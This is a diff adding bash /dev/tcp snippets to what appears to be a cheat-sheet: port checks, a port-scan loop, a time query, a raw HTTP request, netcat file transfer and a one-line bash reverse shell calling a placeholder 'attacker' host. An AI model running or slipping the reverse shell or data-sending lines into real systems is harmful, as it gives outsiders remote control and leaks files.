@@ -6,4 +6,34 @@
  bla..
 COMMENT1
 
+
+# bash socket
+timeout 0.5 echo -n 2>/dev/null < /dev/tcp/127.0.0.1/7777 && echo "open" || echo "closed"
+
+# bash k8s
+kubectl exec -it svc/random-service -- bash
+$ echo < /dev/tcp/other-service.namespace.svc.cluster.local/7777 && echo "open" || echo "closed"
+
+# bash scanner
+for port in {1..8888}; do
+  echo -n 2>/dev/null < /dev/tcp/127.0.0.1/$port && echo "$port/tcp open"
+done
+
+# read the time
+cat < /dev/tcp/time.nist.gov/13
+
+# file transfer
+nc -lvnp 7777 < file.txt
+cat < /dev/tcp/sender/7777 > file.txt
+cat file.txt > /dev/tcp/receiver/7777
+
+# bash reverse shell
+nc -lvnp 7777
+bash -c 'bash -i >& /dev/tcp/attacker/7777 0>&1'
+
+# bash http reques
+exec 5<>/dev/tcp/www.google.com/80
+echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&5
+cat <&5
+
 $ IP_VERSION: echo '4 6' | tr ' ' '\n'
